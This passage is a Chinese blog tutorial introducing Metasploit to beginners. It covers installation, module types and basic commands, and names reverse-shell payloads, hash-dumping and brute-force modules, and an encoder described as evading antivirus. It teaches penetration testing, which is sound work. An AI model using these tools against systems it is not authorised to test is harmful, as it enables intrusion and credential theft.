@@ -1,0 +1,1713 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本教程面向零基础人群，从安装到实战，逐步讲解 Metasploit Framework 的使用方法。请确保所有操作均在合法授权的环境中进行。   目录 什么是 Metasploit Framework 安装与环境配置 MSF 核心概念与模块体系 MSF 目录结构 启动 MSF 与基本命令 渗透测试完整流程 实战案例一：Windows 漏洞利用（MS17-010） 实战案例二：Linux 提权（D">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit Framework (MSF) 零基础入门教程">
+<meta property="og:url" content="https://chiya-66.github.io/2026/07/21/MSF%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="本教程面向零基础人群，从安装到实战，逐步讲解 Metasploit Framework 的使用方法。请确保所有操作均在合法授权的环境中进行。   目录 什么是 Metasploit Framework 安装与环境配置 MSF 核心概念与模块体系 MSF 目录结构 启动 MSF 与基本命令 渗透测试完整流程 实战案例一：Windows 漏洞利用（MS17-010） 实战案例二：Linux 提权（D">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-21T01:12:30.000Z">
+<meta property="article:modified_time" content="2026-11-07T11:26:23.028Z">
+<meta property="article:author" content="chiya-66">
+<meta property="article:tag" content="MSF">
+<meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Metasploit Framework (MSF) 零基础入门教程 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Metasploit Framework (MSF) 零基础入门教程"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-07-21 09:12" pubdate>
+          2026年7月21日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          133 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Metasploit Framework (MSF) 零基础入门教程</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>本教程面向零基础人群，从安装到实战，逐步讲解 Metasploit Framework 的使用方法。请确保所有操作均在合法授权的环境中进行。</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li><a href="#1-%E4%BB%80%E4%B9%88%E6%98%AF-metasploit-framework">什么是 Metasploit Framework</a></li>
+<li><a href="#2-%E5%AE%89%E8%A3%85%E4%B8%8E%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">安装与环境配置</a></li>
+<li><a href="#3-msf-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%A8%A1%E5%9D%97%E4%BD%93%E7%B3%BB">MSF 核心概念与模块体系</a></li>
+<li><a href="#4-msf-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">MSF 目录结构</a></li>
+<li><a href="#5-%E5%90%AF%E5%8A%A8-msf-%E4%B8%8E%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4">启动 MSF 与基本命令</a></li>
+<li><a href="#6-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B">渗透测试完整流程</a></li>
+<li><a href="#7-%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E4%B8%80windows-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8ms17-010">实战案例一：Windows 漏洞利用（MS17-010）</a></li>
+<li><a href="#8-%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E4%BA%8Clinux-%E6%8F%90%E6%9D%83dirtycow">实战案例二：Linux 提权（DirtyCow）</a></li>
+<li><a href="#9-msfvenompayload-%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7">msfvenom：Payload 生成工具</a></li>
+<li><a href="#10-%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3">后渗透操作详解</a></li>
+<li><a href="#11-meterpreter-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5">Meterpreter 常用命令速查</a></li>
+<li><a href="#12-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80">内网渗透基础</a></li>
+<li><a href="#13-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5">常见问题排查</a></li>
+<li><a href="#14-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E4%B8%8E%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA">学习资源与练习靶场</a></li>
+<li><a href="#15-%E6%B3%95%E5%BE%8B%E4%B8%8E%E9%81%93%E5%BE%B7%E5%A3%B0%E6%98%8E">法律与道德声明</a></li>
+</ol>
+<hr>
+<h2 id="1-什么是-Metasploit-Framework"><a href="#1-什么是-Metasploit-Framework" class="headerlink" title="1. 什么是 Metasploit Framework"></a>1. 什么是 Metasploit Framework</h2><p>Metasploit Framework（简称 MSF）是一个开源的渗透测试框架，由 H.D. Moore 于 2003 年创建，目前由 Rapid7 公司维护。它集成了数千个已知漏洞的利用代码，是安全研究人员和渗透测试工程师最常用的工具之一。</p>
+<p>MSF 的核心价值在于<strong>模块化设计</strong>：它将渗透测试的各个环节（信息收集、漏洞利用、后渗透、权限维持等）封装成独立的模块，使用者只需组合这些模块即可完成复杂的攻击链条，无需从零编写代码。</p>
+<p><strong>MSF 的主要特点：</strong></p>
+<ul>
+<li><strong>模块化架构</strong>：所有功能以模块形式存在，按需加载，灵活组合</li>
+<li><strong>活跃的社区支持</strong>：全球安全研究者持续贡献新的漏洞利用模块</li>
+<li><strong>易于扩展</strong>：支持使用 Ruby 语言编写自定义模块</li>
+<li><strong>跨平台</strong>：支持 Linux、Windows、macOS 等操作系统</li>
+<li><strong>丰富的 Payload 库</strong>：内置多种类型的载荷，满足不同场景需求</li>
+</ul>
+<hr>
+<h2 id="2-安装与环境配置"><a href="#2-安装与环境配置" class="headerlink" title="2. 安装与环境配置"></a>2. 安装与环境配置</h2><h3 id="2-1-推荐环境"><a href="#2-1-推荐环境" class="headerlink" title="2.1 推荐环境"></a>2.1 推荐环境</h3><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>推荐配置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>Kali Linux（预装 MSF）</td>
+</tr>
+<tr>
+<td>内存</td>
+<td>至少 4GB（建议 8GB 以上）</td>
+</tr>
+<tr>
+<td>磁盘</td>
+<td>至少 20GB 可用空间</td>
+</tr>
+<tr>
+<td>网络</td>
+<td>能与目标主机通信的局域网环境</td>
+</tr>
+</tbody></table>
+<p><strong>为什么推荐 Kali Linux？</strong> Kali Linux 是专为渗透测试设计的 Linux 发行版，预装了 Metasploit Framework 以及数百种安全工具，省去大量环境配置工作。</p>
+<h3 id="2-2-在-Kali-Linux-中安装-更新-MSF"><a href="#2-2-在-Kali-Linux-中安装-更新-MSF" class="headerlink" title="2.2 在 Kali Linux 中安装&#x2F;更新 MSF"></a>2.2 在 Kali Linux 中安装&#x2F;更新 MSF</h3><p>Kali Linux 默认已预装 Metasploit Framework。首次使用时，建议更新到最新版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新软件源</span><br><span class="hljs-built_in">sudo</span> apt update<br><br><span class="hljs-comment"># 安装/更新 Metasploit Framework</span><br><span class="hljs-built_in">sudo</span> apt install metasploit-framework<br><br><span class="hljs-comment"># 启动 PostgreSQL 数据库服务（MSF 依赖此服务存储扫描结果）</span><br><span class="hljs-built_in">sudo</span> service postgresql start<br><br><span class="hljs-comment"># 初始化 MSF 数据库</span><br><span class="hljs-built_in">sudo</span> msfdb init<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-3-在其他-Linux-系统中安装"><a href="#2-3-在其他-Linux-系统中安装" class="headerlink" title="2.3 在其他 Linux 系统中安装"></a>2.3 在其他 Linux 系统中安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载官方安装脚本</span><br>curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall &gt; msfinstall<br><br><span class="hljs-comment"># 赋予执行权限</span><br><span class="hljs-built_in">chmod</span> +x msfinstall<br><br><span class="hljs-comment"># 运行安装脚本</span><br><span class="hljs-built_in">sudo</span> ./msfinstall<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-4-在-Windows-中安装"><a href="#2-4-在-Windows-中安装" class="headerlink" title="2.4 在 Windows 中安装"></a>2.4 在 Windows 中安装</h3><p>从 Rapid7 官网下载 Windows 版安装包，按照向导完成安装。安装完成后，在开始菜单中找到 <strong>Metasploit Framework</strong> 并启动。注意：Windows 版本的功能可能不如 Linux 版本完整。</p>
+<h3 id="2-5-验证安装"><a href="#2-5-验证安装" class="headerlink" title="2.5 验证安装"></a>2.5 验证安装</h3><p>在终端中输入以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br></code></pre></td></tr></table></figure>
+
+<p>如果看到 MSF 的 ASCII 艺术字欢迎界面和 <code>msf6 &gt;</code> 命令提示符，说明安装成功。</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">       =[ metasploit v6.3.xx-dev                          ]<br>+ -- --=[<span class="hljs-number"> 2342 </span>exploits -<span class="hljs-number"> 1234 </span>auxiliary -<span class="hljs-number"> 456 </span>post        ]<br>+ -- --=[<span class="hljs-number"> 789 </span>payloads -<span class="hljs-number"> 45 </span>encoders -<span class="hljs-number"> 12 </span>nops             ]<br>+ -- --=[<span class="hljs-number"> 9 </span>evasion                                        ]<br><br>msf6 &gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="3-MSF-核心概念与模块体系"><a href="#3-MSF-核心概念与模块体系" class="headerlink" title="3. MSF 核心概念与模块体系"></a>3. MSF 核心概念与模块体系</h2><p>理解 MSF 的模块体系是学习的关键。MSF 将渗透测试拆分为多个环节，每个环节对应一类模块。</p>
+<h3 id="3-1-六大核心模块"><a href="#3-1-六大核心模块" class="headerlink" title="3.1 六大核心模块"></a>3.1 六大核心模块</h3><h4 id="（1）Exploit（漏洞利用模块）"><a href="#（1）Exploit（漏洞利用模块）" class="headerlink" title="（1）Exploit（漏洞利用模块）"></a>（1）Exploit（漏洞利用模块）</h4><p><strong>作用</strong>：触发目标系统的漏洞，获取访问权限。</p>
+<p>Exploit 是渗透测试的核心模块。它包含针对特定漏洞的攻击代码，例如著名的 MS17-010（永恒之蓝）漏洞利用模块。</p>
+<p><strong>模块路径示例</strong>：<code>exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p><strong>通俗理解</strong>：Exploit 相当于”钥匙”，用于打开目标系统的”门锁”（漏洞）。</p>
+<h4 id="（2）Payload（载荷模块）"><a href="#（2）Payload（载荷模块）" class="headerlink" title="（2）Payload（载荷模块）"></a>（2）Payload（载荷模块）</h4><p><strong>作用</strong>：漏洞利用成功后，在目标系统上执行的代码。</p>
+<p>Payload 决定了你获得目标控制权后以什么方式与目标通信。最常见的 Payload 是<strong>反弹 Shell（Reverse Shell）</strong>，即让目标主机主动连接攻击者的机器。</p>
+<p><strong>常见 Payload 类型</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>Payload 类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>windows/meterpreter/reverse_tcp</code></td>
+<td>Windows 反弹 Meterpreter（TCP）</td>
+</tr>
+<tr>
+<td><code>windows/meterpreter/reverse_https</code></td>
+<td>Windows 反弹 Meterpreter（HTTPS，更隐蔽）</td>
+</tr>
+<tr>
+<td><code>linux/x64/meterpreter/reverse_tcp</code></td>
+<td>Linux 64位反弹 Meterpreter</td>
+</tr>
+<tr>
+<td><code>windows/x64/shell/reverse_tcp</code></td>
+<td>Windows 反弹普通 Shell</td>
+</tr>
+<tr>
+<td><code>php/meterpreter/reverse_tcp</code></td>
+<td>PHP 反弹 Meterpreter</td>
+</tr>
+</tbody></table>
+<p><strong>通俗理解</strong>：Payload 相当于”快递员”，Exploit 打开门后，Payload 进入目标系统并建立与你的通信通道。</p>
+<h4 id="（3）Auxiliary（辅助模块）"><a href="#（3）Auxiliary（辅助模块）" class="headerlink" title="（3）Auxiliary（辅助模块）"></a>（3）Auxiliary（辅助模块）</h4><p><strong>作用</strong>：用于信息收集、扫描、漏洞验证等辅助任务。</p>
+<p>Auxiliary 模块不会直接攻击目标，而是帮助你了解目标系统的情况。</p>
+<p><strong>常用 Auxiliary 模块</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>auxiliary/scanner/portscan/tcp</code></td>
+<td>TCP 端口扫描</td>
+</tr>
+<tr>
+<td><code>auxiliary/scanner/smb/smb_version</code></td>
+<td>SMB 服务版本探测</td>
+</tr>
+<tr>
+<td><code>auxiliary/scanner/ssh/ssh_login</code></td>
+<td>SSH 弱口令爆破</td>
+</tr>
+<tr>
+<td><code>auxiliary/scanner/http/dir_scanner</code></td>
+<td>Web 目录扫描</td>
+</tr>
+<tr>
+<td><code>auxiliary/scanner/ftp/ftp_login</code></td>
+<td>FTP 弱口令测试</td>
+</tr>
+</tbody></table>
+<p><strong>通俗理解</strong>：Auxiliary 相当于”侦察兵”，在发动攻击前帮你摸清目标的情况。</p>
+<h4 id="（4）Post（后渗透模块）"><a href="#（4）Post（后渗透模块）" class="headerlink" title="（4）Post（后渗透模块）"></a>（4）Post（后渗透模块）</h4><p><strong>作用</strong>：在获得目标控制权后，执行进一步的操作。</p>
+<p>当你已经拿下了目标主机的 Shell，Post 模块可以帮助你收集信息、提升权限、横向移动等。</p>
+<p><strong>常用 Post 模块</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>post/windows/gather/hashdump</code></td>
+<td>抓取 Windows 密码哈希</td>
+</tr>
+<tr>
+<td><code>post/windows/manage/migrate</code></td>
+<td>进程迁移</td>
+</tr>
+<tr>
+<td><code>post/multi/recon/local_exploit_suggester</code></td>
+<td>本地提权建议</td>
+</tr>
+<tr>
+<td><code>post/windows/gather/enum_logged_on_users</code></td>
+<td>枚举登录用户</td>
+</tr>
+<tr>
+<td><code>post/linux/gather/hashdump</code></td>
+<td>抓取 Linux 密码哈希</td>
+</tr>
+</tbody></table>
+<p><strong>通俗理解</strong>：Post 相当于”内应”，进入目标后帮你搜集情报、巩固控制。</p>
+<h4 id="（5）Encoder（编码器模块）"><a href="#（5）Encoder（编码器模块）" class="headerlink" title="（5）Encoder（编码器模块）"></a>（5）Encoder（编码器模块）</h4><p><strong>作用</strong>：对 Payload 进行编码&#x2F;混淆，绕过杀毒软件和防火墙的检测。</p>
+<p>MSF 中最著名的编码器是 <code>shikata_ga_nai</code>（日语：仕方がない，意为”没办法”），它使用多态 XOR 编码技术，每次生成的 Payload 都不同。</p>
+<p><strong>通俗理解</strong>：Encoder 相当于”伪装面具”，让 Payload 改头换面，躲过安检。</p>
+<h4 id="（6）NOP（空指令模块）"><a href="#（6）NOP（空指令模块）" class="headerlink" title="（6）NOP（空指令模块）"></a>（6）NOP（空指令模块）</h4><p><strong>作用</strong>：生成空指令（No Operation），用于填充 Payload 以确保在缓冲区溢出攻击中稳定执行。</p>
+<p><strong>通俗理解</strong>：NOP 相当于”填充物”，确保 Payload 在内存中正确对齐。</p>
+<h3 id="3-2-模块命名规则"><a href="#3-2-模块命名规则" class="headerlink" title="3.2 模块命名规则"></a>3.2 模块命名规则</h3><p>MSF 的模块路径遵循统一的命名规则：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">模块类型<span class="hljs-regexp">/目标平台/</span>服务或协议/模块名称<br></code></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<ul>
+<li><code>exploit/windows/smb/ms17_010_eternalblue</code><ul>
+<li><code>exploit</code>：漏洞利用模块</li>
+<li><code>windows</code>：目标平台是 Windows</li>
+<li><code>smb</code>：针对 SMB 服务</li>
+<li><code>ms17_010_eternalblue</code>：利用 MS17-010 永恒之蓝漏洞</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="4-MSF-目录结构"><a href="#4-MSF-目录结构" class="headerlink" title="4. MSF 目录结构"></a>4. MSF 目录结构</h2><p>了解 MSF 的文件存放位置，有助于你理解模块的组织方式，也方便你自定义模块。</p>
+<h3 id="4-1-主要目录（Kali-Linux）"><a href="#4-1-主要目录（Kali-Linux）" class="headerlink" title="4.1 主要目录（Kali Linux）"></a>4.1 主要目录（Kali Linux）</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>metasploit-framework<span class="hljs-symbol">/</span><br>├── modules<span class="hljs-symbol">/</span>          <span class="hljs-comment"># 所有模块</span><br>│   ├── exploits<span class="hljs-symbol">/</span>     <span class="hljs-comment"># 漏洞利用模块</span><br>│   ├── payloads<span class="hljs-symbol">/</span>     <span class="hljs-comment"># 载荷模块</span><br>│   ├── auxiliary<span class="hljs-symbol">/</span>    <span class="hljs-comment"># 辅助模块</span><br>│   ├── post<span class="hljs-symbol">/</span>         <span class="hljs-comment"># 后渗透模块</span><br>│   ├── encoders<span class="hljs-symbol">/</span>     <span class="hljs-comment"># 编码器模块</span><br>│   ├── nops<span class="hljs-symbol">/</span>         <span class="hljs-comment"># 空指令模块</span><br>│   └── evasion<span class="hljs-symbol">/</span>      <span class="hljs-comment"># 免杀模块</span><br>├── data<span class="hljs-symbol">/</span>             <span class="hljs-comment"># 数据文件（字典、模板等）</span><br>├── scripts<span class="hljs-symbol">/</span>          <span class="hljs-comment"># 脚本文件</span><br>├── tools<span class="hljs-symbol">/</span>            <span class="hljs-comment"># 附加工具</span><br>└── plugins<span class="hljs-symbol">/</span>          <span class="hljs-comment"># 插件</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-2-自定义模块目录"><a href="#4-2-自定义模块目录" class="headerlink" title="4.2 自定义模块目录"></a>4.2 自定义模块目录</h3><p>如果你需要添加自定义模块，可以放在以下目录（MSF 会自动加载）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/.msf4/modules/<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="5-启动-MSF-与基本命令"><a href="#5-启动-MSF-与基本命令" class="headerlink" title="5. 启动 MSF 与基本命令"></a>5. 启动 MSF 与基本命令</h2><h3 id="5-1-启动-MSF-控制台"><a href="#5-1-启动-MSF-控制台" class="headerlink" title="5.1 启动 MSF 控制台"></a>5.1 启动 MSF 控制台</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 先启动数据库服务</span><br><span class="hljs-built_in">sudo</span> service postgresql start<br><br><span class="hljs-comment"># 启动 MSF</span><br>msfconsole<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-2-核心命令速查表"><a href="#5-2-核心命令速查表" class="headerlink" title="5.2 核心命令速查表"></a>5.2 核心命令速查表</h3><p>以下命令是 MSF 中使用频率最高的命令，建议熟记：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>help</code></td>
+<td>显示帮助信息</td>
+<td><code>help</code></td>
+</tr>
+<tr>
+<td><code>search</code></td>
+<td>搜索模块</td>
+<td><code>search ms17-010</code></td>
+</tr>
+<tr>
+<td><code>use</code></td>
+<td>加载模块</td>
